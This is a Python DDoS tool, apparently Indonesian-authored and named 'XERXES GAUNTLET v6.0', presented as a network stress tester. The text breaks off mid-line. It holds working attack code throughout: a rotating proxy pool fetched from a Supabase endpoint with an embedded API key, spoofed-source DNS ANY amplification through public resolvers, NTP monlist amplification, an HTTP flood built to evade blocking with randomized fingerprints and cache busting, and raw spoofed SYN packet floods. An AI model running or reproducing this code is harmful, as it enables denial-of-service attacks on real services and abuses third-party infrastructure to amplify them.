#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  XERXES GAUNTLET v6.0                                                       ║
║  Network Resilience Diagnostic Suite — Level Omega                          ║
║  ════════════════════════════════════════════════                            ║
║  KATEGORI       : Alat Uji Ketahanan Jaringan (Stress Testing)              ║
║  KEMAMPUAN BARU : Proxy-Grade HTTP Flood, Amplification, L7 Intelligence    ║
║  VERSI          : 6.0.0-gauntlet                                            ║
║  ════════════════════════════════════════════════                            ║
║  — PROXY SYSTEM: 375k+ proxy dari Supabase, auto-rotate, quality-weighted   ║
║  — AMPLIFICATION: DNS / NTP / SSDP — 10x-10000x bandwidth multiplier       ║
║  — HTTP FLOOD: setip proxy beda IP, beda fingerprint, cache busting         ║
║  — L7 ATTACKS: SSL reneg, HTTP/2, WebSocket, slow-read, cache poison       ║
║  — ADAPTIVE ENGINE: auto-detect block, shift proxy, pivot vector            ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import sys, os, time, socket, struct, random, threading, argparse
import signal, logging, asyncio, math, uuid, collections, hashlib, json
import urllib.request, urllib.error, urllib.parse, ssl, subprocess, re, ipaddress
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Tuple, Any, Set
from dataclasses import dataclass, field

# ==================== TRY IMPORTS (graceful fallback) ====================
try:
    import aiohttp
    from aiohttp import ClientSession, TCPConnector, ClientTimeout
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    import aiohttp_socks
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

# ==================== GLOBAL CONFIG ====================
VERSION = "6.0.0-gauntlet"
SCRIPT_NAME = "xerxes_gauntlet"
LOG_FILE = f"{SCRIPT_NAME}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

# Supabase proxy source
PROXY_API_URL = "https://vwmhbpgwhfwuwtattset.supabase.co/functions/v1/fetch-proxies"
PROXY_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ3bWhicGd3aGZ3dXd0YXR0c2V0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjczMjc0NjYsImV4cCI6MjA4MjkwMzQ2Nn0.LSMD2P4whDzoIW4UCig0ly0j6UOxd5fHhIkUhywnmrg"

stats = {
    "packets_sent": 0, "bytes_sent": 0, "connections_opened": 0,
    "errors": 0, "start_time": None, "running": True, "lock": threading.Lock(),
    "bypass_activated": 0, "reality_shifts": 0, "proxy_rotations": 0,
    "amplification_factor": 0, "requests_done": 0
}

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8'), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/",
    "https://twitter.com/", "https://www.instagram.com/", "https://www.linkedin.com/",
    "https://www.reddit.com/", "https://t.co/", "https://www.youtube.com/",
    "https://news.google.com/", "https://duckduckgo.com/", "https://www.pinterest.com/",
]

# ==================== HELPER FUNCTIONS ====================
def checksum(data: bytes) -> int:
    if len(data) % 2 == 1: data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def random_ip() -> str:
    return f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"

def random_port() -> int:
    return random.randint(1024, 65535)

def get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip
    except: return "127.0.0.1"

def signal_handler(sig, frame):
    logger.info("\n[!] Received interrupt. Shutting down...")
    stats["running"] = False
    print_stats_final()

def print_stats_final():
    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
    logger.info("=" * 60)
    logger.info("  FINAL LAB TEST REPORT")
    logger.info("=" * 60)
    logger.info(f"  Duration          : {elapsed:.2f}s")
    logger.info(f"  Total Packets/Req : {stats['packets_sent']:,}")
    logger.info(f"  Total Data        : {stats['bytes_sent'] / (1024*1024):.2f} MB")
    logger.info(f"  Connections       : {stats['connections_opened']:,}")
    logger.info(f"  Requests Done     : {stats['requests_done']:,}")
    logger.info(f"  Errors/Blocked    : {stats['errors']:,}")
    logger.info(f"  Proxy Rotations   : {stats['proxy_rotations']}")
    logger.info(f"  Bypass Triggers   : {stats['bypass_activated']}")
    logger.info(f"  Reality Shifts    : {stats['reality_shifts']}")
    if elapsed > 0:
        logger.info(f"  Avg Rate          : {stats['packets_sent']/elapsed:,.0f} pps")
        logger.info(f"  Avg Bandwidth     : {(stats['bytes_sent']*8)/elapsed/1000000:.2f} Mbps")
        if stats.get('amplification_factor', 0) > 1:
            logger.info(f"  Amplification     : {stats['amplification_factor']}x")
    logger.info("=" * 60)
    logger.info(f"[i] Log: {LOG_FILE}")

# ========================================================================
#  PROXY SYSTEM — INTI DARI KEKUATAN BARU
# ========================================================================
@dataclass
class Proxy:
    ip: str
    port: int
    proxy_type: str = "HTTP"  # HTTP, SOCKS4, SOCKS5
    country: str = "Unknown"
    response_time: int = 999
    quality_score: int = 50
    anonymity: str = "Unknown"
    failures: int = 0
    max_failures: int = 3
    last_used: float = 0
    alive: bool = True

    @property
    def url(self) -> str:
        t = self.proxy_type.lower().replace("socks5", "socks5").replace("socks4", "socks4")
        if self.proxy_type == "HTTP":
            return f"http://{self.ip}:{self.port}"
        elif self.proxy_type == "SOCKS5":
            return f"socks5://{self.ip}:{self.port}"
        elif self.proxy_type == "SOCKS4":
            return f"socks4://{self.ip}:{self.port}"
        return f"http://{self.ip}:{self.port}"

    @property
    def weight(self) -> float:
        """Weight for quality-weighted random selection"""
        w = self.quality_score / 100.0
        if self.response_time < 200: w *= 1.5
        elif self.response_time < 500: w *= 1.2
        elif self.response_time > 1000: w *= 0.5
        if not self.alive: w = 0
        if self.failures > 0: w *= (1.0 - (self.failures / (self.max_failures + 1)))
        return max(0, w)


class ProxyFetcher:
    """Fetch proxies dari Supabase endpoint — 375k+ proxy pool"""

    def __init__(self, api_url: str = PROXY_API_URL, api_key: str = PROXY_API_KEY):
        self.api_url = api_url
        self.api_key = api_key
        self.proxies: List[Proxy] = []
        self.last_fetch = 0
        self.cache_ttl = 60  # refresh every 60s
        self.total_available = 0

    def fetch(self, limit: int = 200, min_quality: int = 60) -> List[Proxy]:
        """Fetch proxies from Supabase API"""
        try:
            headers = {
                "Authorization": f"Bearer {self.api_key}",
                "Content-Type": "application/json"
            }
            data = json.dumps({"limit": limit, "minQuality": min_quality}).encode()
            req = urllib.request.Request(self.api_url, headers=headers, data=data)

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            with urllib.request.urlopen(req, timeout=20, context=ctx) as resp:
                result = json.loads(resp.read())

            if not result.get("success"):
                logger.warning(f"[PROXY] API returned success=false: {result}")
                return []

            raw_proxies = result.get("proxies", [])
            self.total_available = result.get("totalAvailable", 0)

            parsed = []
            for p in raw_proxies:
                proxy = Proxy(
                    ip=p.get("ip", "0.0.0.0"),
                    port=int(p.get("port", 0)),
                    proxy_type=p.get("type", "HTTP"),
                    country=p.get("country", "Unknown"),
                    response_time=p.get("responseTime", 999),
                    quality_score=p.get("qualityScore", 50),
                    anonymity=p.get("anonymity", "Unknown"),
                )
                # Filter by quality
                if proxy.quality_score >= min_quality and proxy.port > 0:
                    parsed.append(proxy)

            self.last_fetch = time.time()
            logger.info(f"[PROXY] Fetched {len(parsed)} proxies (avail: {self.total_available:,})")
            return parsed

        except urllib.error.HTTPError as e:
            logger.warning(f"[PROXY] HTTP {e.code}: {e.read().decode()[:200]}")
        except Exception as e:
            logger.warning(f"[PROXY] Fetch error: {e}")
        return []

    def validate(self, proxy: Proxy, timeout: float = 4.0) -> bool:
        """Check if proxy is alive by connecting to a test endpoint"""
        try:
            test_url = "http://httpbin.org/ip"
            # Only HTTP proxies can be tested this way; SOCKS needs different method
            if proxy.proxy_type not in ("HTTP", "HTTPS"):
                # For SOCKS, just mark alive and let runtime handle failures
                proxy.alive = True
                proxy.response_time = 500
                return True

            proxy_handler = urllib.request.ProxyHandler({
                "http": f"http://{proxy.ip}:{proxy.port}"
            })
            opener = urllib.request.build_opener(proxy_handler)
            start = time.time()

            with opener.open(test_url, timeout=timeout) as resp:
                resp.read(512)

            proxy.response_time = int((time.time() - start) * 1000)
            proxy.alive = True
            return True
        except Exception:
            proxy.alive = False
            return False

    def fetch_and_validate(self, limit: int = 200, min_quality: int = 60,
                           max_proxies: int = 100, validate: bool = True) -> List[Proxy]:
        """Fetch + optionally validate proxies"""
        proxies = self.fetch(limit=limit, min_quality=min_quality)
        if not proxies:
            return []

        if validate:
            logger.info(f"[PROXY] Validating {len(proxies)} proxies...")
            alive = []
            for i, p in enumerate(proxies):
                if not stats["running"]: break
                if self.validate(p):
                    alive.append(p)
                if (i + 1) % 20 == 0:
                    logger.info(f"[PROXY] Validated {i+1}/{len(proxies)}, alive: {len(alive)}")

            proxies = alive[:max_proxies]
            logger.info(f"[PROXY] {len(proxies)} proxies alive after validation")

            # Quick stats
            by_type = collections.Counter(p.proxy_type for p in proxies)
            logger.info(f"[PROXY] Types: {dict(by_type)}")
            avg_q = sum(p.quality_score for p in proxies) / max(len(proxies), 1)
            logger.info(f"[PROXY] Avg quality: {avg_q:.0f}")

        return proxies


class ProxyRotator:
    """Smart proxy rotation — quality-weighted, adaptive, auto-refresh"""

    def __init__(self, proxy_fetcher: ProxyFetcher):
        self.fetcher = proxy_fetcher
        self.proxies: List[Proxy] = []
        self.lock = threading.Lock()
        self.index = 0
        self.min_pool = 10
        self.refresh_interval = 120
        self.last_refresh = 0
        self.blacklist: Set[str] = set()

    def init_pool(self, initial_proxies: List[Proxy] = None):
        if initial_proxies:
            self.proxies = initial_proxies
        else:
            self.proxies = self.fetcher.fetch_and_validate(limit=300, min_quality=60, max_proxies=150)

        self.last_refresh = time.time()
        logger.info(f"[ROTATOR] Pool initialized with {len(self.proxies)} proxies")

    def get_proxy(self) -> Optional[Proxy]:
        """Get next proxy using quality-weighted random selection"""
        with self.lock:
            self._maybe_refresh()
            alive = [p for p in self.proxies if p.alive and
                     f"{p.ip}:{p.port}" not in self.blacklist]
            if not alive:
                logger.warning("[ROTATOR] No alive proxies! Triggering refresh...")
                self._force_refresh()
                alive = [p for p in self.proxies if p.alive and
                         f"{p.ip}:{p.port}" not in self.blacklist]
                if not alive:
                    return None

            # Quality-weighted selection
            weights = [p.weight for p in alive]
            total_w = sum(weights)
            if total_w <= 0:
                proxy = random.choice(alive)
            else:
                proxy = random.choices(alive, weights=weights, k=1)[0]

            proxy.last_used = time.time()
            stats["proxy_rotations"] += 1
            return proxy

    def mark_dead(self, proxy: Proxy, reason: str = ""):
        """Mark proxy as dead and optionally blacklist"""
        with self.lock:
            proxy.failures += 1
            if proxy.failures >= proxy.max_failures:
                proxy.alive = False
                self.blacklist.add(f"{proxy.ip}:{proxy.port}")
                if reason:
                    logger.debug(f"[ROTATOR] Proxy {proxy.ip}:{proxy.port} dead: {reason}")
                stats["errors"] += 1

    def mark_success(self, proxy: Proxy):
        """Reduce failure count on success"""
        with self.lock:
            if proxy.failures > 0:
                proxy.failures = max(0, proxy.failures - 1)

    def _maybe_refresh(self):
        """Auto-refresh pool if stale or running low"""
        if len(self.proxies) < self.min_pool or \
           (time.time() - self.last_refresh) > self.refresh_interval:
            self._force_refresh()

    def _force_refresh(self):
        """Force pool refresh"""
        fresh = self.fetcher.fetch(limit=200, min_quality=50)
        if fresh:
            # Keep alive old ones, replace dead with fresh
            keep = [p for p in self.proxies if p.alive]
            self.proxies = (keep + fresh)[:300]
            self.last_refresh = time.time()
            logger.info(f"[ROTATOR] Pool refreshed: {len(self.proxies)} proxies "
                       f"({sum(1 for p in self.proxies if p.alive)} alive)")

    def alive_count(self) -> int:
        with self.lock:
            return sum(1 for p in self.proxies if p.alive)

    def stats(self) -> Dict:
        with self.lock:
            return {
                "total": len(self.proxies),
                "alive": sum(1 for p in self.proxies if p.alive),
                "blacklisted": len(self.blacklist),
                "types": dict(collections.Counter(p.proxy_type for p in self.proxies if p.alive)),
            }


# ========================================================================
#  AMPLIFICATION ENGINES — 10x-10000x MULTIPLIER
# ========================================================================

class DNSAmplifier:
    """DNS ANY query amplification — factor ~50x"""
    def __init__(self, target_ip: str, dns_servers: List[str] = None,
                 threads: int = 50):
        self.target_ip = target_ip
        self.threads = threads
        # Default open resolvers (known public ones)
        self.dns_servers = dns_servers or [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "208.67.222.222", "208.67.220.220", "9.9.9.9",
            "64.6.64.6", "64.6.65.6", "185.228.168.9",
        ]
        # ANY query — largest response (can also do TXT for bigger)
        self.domains = [
            "isc.org", "ripe.net", "google.com", "cloudflare.com",
            "amazon.com", "microsoft.com", "facebook.com", "apple.com",
            "netflix.com", "twitter.com", "github.com", "stackoverflow.com",
        ]

    def _build_dns_query(self, domain: str, query_type: int = 255) -> bytes:
        """ANY query (type=255) — largest amplification factor"""
        tid = random.randint(0, 0xFFFF)
        # Header: ID, flags (0x0100 = recursion desired), QDCOUNT=1, AN=0, NS=0, AR=0
        header = struct.pack('!HHHHHH', tid, 0x0100, 1, 0, 0, 0)
        # Question
        qname = b''.join(
            bytes([len(part)]) + part.encode()
            for part in domain.split('.')
        ) + b'\x00'
        qtype = struct.pack('!HH', query_type, 1)  # type=255 (ANY), class=IN
        return header + qname + qtype

    def _worker(self):
        raw_sock = None
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            pass  # fallback to UDP

        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while stats["running"]:
            try:
                server = random.choice(self.dns_servers)
                domain = random.choice(self.domains)
                query = self._build_dns_query(domain)

                if raw_sock:
                    # Spoof source as target IP
                    src_ip = self.target_ip
                    src_port = random_port()
                    # IP header
                    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                        0x45, 0, 20 + len(query), random.randint(0,65535), 0,
                        64, socket.IPPROTO_UDP, 0,
                        socket.inet_aton(src_ip), socket.inet_aton(server))
                    ip_checksum = checksum(ip_hdr)
                    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                        0x45, 0, 20 + len(query), random.randint(0,65535), 0,
                        64, socket.IPPROTO_UDP, ip_checksum,
                        socket.inet_aton(src_ip), socket.inet_aton(server))
                    # UDP header
                    udp_hdr = struct.pack('!HHHH', src_port, 53, 8 + len(query), 0)
                    packet = ip_hdr + udp_hdr + query
                    raw_sock.sendto(packet, (server, 0))
                    amp_factor = 50  # estimated ~50x amplification
                else:
                    # Direct UDP (no spoof — just for testing / if no raw socket)
                    udp_sock.sendto(query, (server, 53))
                    amp_factor = 1

                with stats["lock"]:
                    stats["packets_sent"] += 1
                    stats["bytes_sent"] += len(query)
                    stats["amplification_factor"] = max(stats["amplification_factor"], amp_factor)
                    stats["connections_opened"] += 1

            except Exception as e:
                with stats["lock"]:
                    stats["errors"] += 1

            time.sleep(random.uniform(0.001, 0.01))

    def start(self):
        logger.info(f"[AMP-DNS] Starting DNS amplification ({len(self.dns_servers)} resolvers, {self.threads}t)")
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()


class NTPAmplifier:
    """NTP monlist amplification — factor ~200x"""
    def __init__(self, target_ip: str, ntp_servers: List[str] = None,
                 threads: int = 30):
        self.target_ip = target_ip
        self.threads = threads
        self.ntp_servers = ntp_servers or [
            "pool.ntp.org", "time.google.com", "time.windows.com",
            "time.apple.com", "time.cloudflare.com", "0.pool.ntp.org",
            "1.pool.ntp.org", "2.pool.ntp.org", "europe.pool.ntp.org",
            "asia.pool.ntp.org",
        ]
        # Monlist request (NTP v2, mode 7, opcode 7)
        # format: LI=0, VN=2, Mode=7, stratum=0, poll=0, precision=0
        # root delay, dispersion, ref id, ref ts, orig ts, rx ts, tx ts
        self.monlist_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4

    def _worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while stats["running"]:
            try:
                server = random.choice(self.ntp_servers)
                try:
                    server_ip = socket.gethostbyname(server)
                except:
                    continue

                sock.sendto(self.monlist_payload, (server_ip, 123))
                with stats["lock"]:
                    stats["packets_sent"] += 1
                    stats["bytes_sent"] += len(self.monlist_payload)
                    stats["connections_opened"] += 1
                    stats["amplification_factor"] = 200  # monlist can be ~200x
            except:
                with stats["lock"]:
                    stats["errors"] += 1
            time.sleep(random.uniform(0.005, 0.02))

    def start(self):
        logger.info(f"[AMP-NTP] NTP monlist ({self.threads}t)")
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()


# ========================================================================
#  PROXY-BASED HTTP FLOOD — SENJATA UTAMA
# ========================================================================

class ProxyHTTPFlood:
    """HTTP flood THROUGH rotating proxies — hardest to mitigate.
    Auto-fallback to direct if proxies die. Mixed HTTP + SOCKS support."""

    def __init__(self, target_url: str, rotator: ProxyRotator = None,
                 method: str = "GET", concurrent: int = 500,
                 duration: int = 60, post_data: Dict = None,
                 random_paths: bool = True, cache_bust: bool = True,
                 max_retries: int = 1, force_proxy: bool = False):
        self.target_url = target_url.rstrip('/')
        self.rotator = rotator
        self.method = method.upper()
        self.concurrent = concurrent
        self.duration = duration
        self.post_data = post_data or {}
        self.random_paths = random_paths
        self.cache_bust = cache_bust
        self.max_retries = max_retries
        self.force_proxy = force_proxy
        self._parsed_url = urllib.parse.urlparse(target_url)

        # Random paths for variety
        self.paths = self._generate_paths(100)

    def _generate_paths(self, count: int) -> List[str]:
        """Generate random realistic-looking paths"""
        base = self._parsed_url.path or "/"
        words = ["api", "v1", "v2", "data", "search", "query", "fetch", "load",
                 "user", "admin", "public", "static", "assets", "images", "css",
                 "js", "auth", "login", "signup", "health", "status", "info",
                 "config", "settings", "profile", "list", "view", "get", "update",
                 "delete", "create", "edit", "save", "export", "import"]
        paths = [base]
        for _ in range(count):
            depth = random.randint(1, 4)
            p = '/'.join(random.choices(words, k=depth))
            paths.append(f"/{p}")
            paths.append(f"/{p}/{random.randint(1,999)}")
        return list(set(paths))

    def _cache_bust_url(self, path: str) -> str:
        """Add cache-busting query params"""
        if self.cache_bust:
            separator = "&" if "?" in path else "?"
            cb = f"{separator}_{uuid.uuid4().hex[:8]}={random.randint(1,999999)}"
            return f"{path}{cb}"
        return path

    def _gen_headers(self) -> Dict[str, str]:
        """Generate realistic browser headers"""
        ua = random.choice(USER_AGENTS)
        is_mobile = "Mobile" in ua
        headers = {
            "User-Agent": ua,
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "application/json, text/plain, */*",
            ]),
            "Accept-Language": random.choice([
                "en-US,en;q=0.9", "en-GB,en;q=0.9", "id,en;q=0.9",
                "en-US,en;q=0.8,id;q=0.6", "en;q=0.9,id;q=0.8",
            ]),
            "Accept-Encoding": random.choice([
                "gzip, deflate, br", "gzip, deflate", "gzip, deflate, br, zstd",
            ]),
            "Connection": random.choice(["keep-alive", "close"]),
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
            "Sec-Ch-Ua": random.choice([
                '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                '"Not)A;Brand";v="99", "Google Chrome";v="125", "Chromium";v="125"',
                '"Brave";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            ]),
            "Sec-Ch-Ua-Mobile": "?0" if not is_mobile else "?1",
            "Sec-Ch-Ua-Platform": random.choice([
                '"Windows"', '"macOS"', '"Linux"', '"Android"', '"iOS"'
            ]),
            "Sec-Fetch-Dest": random.choice(["document", "empty", "image", "script"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors", "same-origin"]),
            "Sec-Fetch-Site": random.choice(["same-origin", "same-site", "cross-site", "none"]),
            "Upgrade-Insecure-Requests": "1",
        }
        # Add referer 60% of the time
        if random.random() < 0.6:
            headers["Referer"] = random.choice(REFERERS) + \
                uuid.uuid4().hex[:6] if random.random() < 0.3 else ""

        # Randomize header order
        items = list(headers.items())
        random.shuffle(items)
        return collections.OrderedDict(items)

    async def _send_request(self, url: str, headers: Dict,
                            proxy: Optional[Proxy]) -> bool:
        """Send single HTTP request through proxy or direct. Returns True on success."""
        timeout = ClientTimeout(total=random.uniform(4, 10))

        # For SOCKS proxies, use separate session with ProxyConnector
        if proxy and proxy.proxy_type in ("SOCKS4", "SOCKS5") and HAS_SOCKS:
            try:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(proxy.url)
                async with ClientSession(connector=connector) as socks_session:
                    if self.method == "GET":
                        async with socks_session.get(url, headers=headers,
                                                     timeout=timeout, ssl=False) as resp:
                            await resp.read()
                    else:
                        async with socks_session.post(url, headers=headers,
                                                      json=self.post_data,
                                                      timeout=timeout, ssl=False) as resp:
                            await resp.read()
                return True
            except Exception:
                return False

        # For HTTP/HTTPS proxies or direct — use the shared session with proxy param
        try:
            proxy_url = proxy.url if proxy else None
            if self.method == "GET":
                async with self._session.get(url, headers=headers,
                                             proxy=proxy_url,
                                             timeout=timeout, ssl=False) as resp:
                    await resp.read()
            else:
                async with self._session.post(url, headers=headers,
                                              proxy=proxy_url,
                                              json=self.post_data,
                                              timeout=timeout, ssl=False) as resp:
                    await resp.read()
            return True
        except Exception:
            return False

    async def _make_request(self, url: str, headers: Dict) -> bool:
        """Try proxy first, fallback to direct if force_proxy=False"""
        # Try proxy if available
        if self.rotator:
            for _ in range(2):  # try up to 2 different proxies
                proxy = self.rotator.get_proxy()
                if not proxy:
                    break
                try:
                    ok = await self._send_request(url, headers, proxy)
                    if ok:
                        self.rotator.mark_success(proxy)
                        return True
                    else:
                        self.rotator.mark_dead(proxy, "failed")
                except Exception:
                    self.rotator.mark_dead(proxy, "exception")
                continue  # try next proxy

        # Fallback to direct if allowed
        if not self.force_proxy:
            try:
                ok = await self._send_request(url, headers, None)
                if ok:
                    return True
            except Exception:
                pass

        return False

    async def _worker_async(self, session: ClientSession, worker_id: int,
                            semaphore: asyncio.Semaphore):
        """Single async worker that attacks through proxies or direct"""
        self._session = session
        start_time = time.time()
        while stats["running"] and (time.time() - start_time) < self.duration:
            # Pick random path
            path = random.choice(self.paths) if self.random_paths else "/"
            url = self._cache_bust_url(f"{self._parsed_url.scheme}://{self._parsed_url.netloc}{path}")
            headers = self._gen_headers()

            async with semaphore:
                ok = await self._make_request(url, headers)

                if ok:
                    with stats["lock"]:
                        stats["requests_done"] += 1
                        stats["bytes_sent"] += len(str(headers).encode()) + len(url)
                        stats["connections_opened"] += 1
                        stats["bypass_activated"] += 1
                # else: error already counted in mark_dead

            # Tiny jitter
            await asyncio.sleep(random.uniform(0, 0.015))

    async def _run_async(self):
        """Run the flood"""
        conn = TCPConnector(
            limit=0, force_close=True, enable_cleanup_closed=True,
            ttl_dns_cache=300, ssl=False,
        )
        sem = asyncio.Semaphore(self.concurrent)

        pool_info = "direct"
        if self.rotator:
            alive = self.rotator.alive_count()
            pool_info = f"{alive} proxies"

        logger.info(f"[HTTP-P] Launching {self.concurrent} workers [{pool_info}]")
        logger.info(f"[HTTP-P] Method={self.method}, CacheBust={self.cache_bust}, "
                   f"ForceProxy={self.force_proxy}")

        async with ClientSession(connector=conn) as session:
            tasks = [
                asyncio.create_task(self._worker_async(session, i, sem))
                for i in range(self.concurrent)
            ]
            await asyncio.sleep(self.duration)
            stats["running"] = False
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)

    def start(self):
        if not HAS_AIOHTTP:
            logger.error("[HTTP-P] aiohttp not installed. Run: pip install aiohttp")
            return
        def run():
            asyncio.run(self._run_async())
        t = threading.Thread(target=run, daemon=True)
        t.start()
        self.thread = t


# ========================================================================
#  LEGACY ATTACK ENGINES (dari v5 — dipertahankan)
# ========================================================================

class QuantumProtocolSynthesizer:
    def __init__(self):
        self.protocol_cache = []
        self.tcp_option_kinds = list(range(2, 255))
        self.exotic_options = [
            (2, 4, 0x05B4), (3, 3, 0x07), (4, 2, 0x00), (5, 10, 0x00),
            (8, 10, 0x00), (28, 4, 0x00), (34, 8, 0x00), (254, 4, 0x00),
        ]

    def generate_tcp_options(self) -> list:
        num_options = random.randint(1, 4)
        options = []
        used_kinds = set()
        for _ in range(num_options):
            kind = random.choice(self.tcp_option_kinds)
            while kind in used_kinds:
                kind = random.choice(self.tcp_option_kinds)
            used_kinds.add(kind)
            length = random.randint(2, 8)
            data = random.getrandbits(length * 8) & ((1 << (length*8)) - 1)
            options.append((kind, length, data))
        return options

    def generate_syn_packet(self, target_ip: str, target_port: int,
                            src_ip: str = None, src_port: int = None) -> bytes:
        if src_ip is None: src_ip = random_ip()
        if src_port is None: src_port = random_port()
        tcp_options_raw = b''
        for kind, length, data in self.generate_tcp_options():
            tcp_options_raw += struct.pack('BB', kind, length)
            remaining = length - 2
            if remaining > 0:
                tcp_options_raw += struct.pack(f'!{remaining//2}H', data)
                if remaining % 2: tcp_options_raw += b'\x00'
        if len(tcp_options_raw) % 4 != 0:
            tcp_options_raw += b'\x00' * (4 - (len(tcp_options_raw) % 4))
        tcp_header_len = 20 + len(tcp_options_raw)
        tcp_doff = tcp_header_len // 4
        flags = 0x02
        if random.random() < 0.3: flags |= 0x01
        tcp_seq = random.randint(0, 0xFFFFFFFF)
        tcp_window = random.randint(1, 0xFFFF)
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port, tcp_seq, 0,
            (tcp_doff << 4), flags, tcp_window, 0, 0)
        tcp_header += tcp_options_raw
        src_ip_bytes = socket.inet_aton(src_ip)
        dst_ip_bytes = socket.inet_aton(target_ip)
        psh = struct.pack('!4s4sBBH', src_ip_bytes, dst_ip_bytes, 0, socket.IPPROTO_TCP, len(tcp_header))
        psh += tcp_header
        tcp_checksum = checksum(psh)
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, target_port, tcp_seq, 0,
            (tcp_doff << 4), flags, tcp_window, tcp_checksum, 0)
        tcp_header += tcp_options_raw
        ip_ihl = 5; ip_ver = 4
        ip_hdr = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, 0, 20 + len(tcp_header), random.randint(0,65535),
            0, random.randint(64, 128), socket.IPPROTO_TCP, 0,
            src_ip_bytes, dst_ip_bytes)
        ip_cs = checksum(ip_hdr)
        ip_hdr = struct.pack('!BBHHHBBH4s4s',
            (ip_ver << 4) + ip_ihl, 0, 20 + len(tcp_header), random.randint(0,65535),
            0, random.randint(64, 128), socket.IPPROTO_TCP, ip_cs,
            src_ip_bytes, dst_ip_bytes)
        return ip_hdr + tcp_header


class OmnipotentSYNFlood:
    def __init__(self, target_ip: str, target_port: int, threads: int = 10,
                 use_qps: bool = True):
        self.target_ip = target_ip; self.target_port = target_port
        self.thread_count = threads
        self.qps = QuantumProtocolSynthesizer() if use_qps else None

    def _worker(self, worker_id: int):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            logger.info(f"[SYN-Q] Worker {worker_id} started")
            while stats["running"]:
                packet = self.qps.generate_syn_packet(self.target_ip, self.target_port) if self.qps else (
                    struct.pack('!BBHHHBBH4s4s', 0x45, 0, 40, random.randint(0,65535), 0, 64,
                        socket.IPPROTO_TCP, 0, socket.inet_aton(random_ip()), socket.inet_aton(self.target_ip)) +
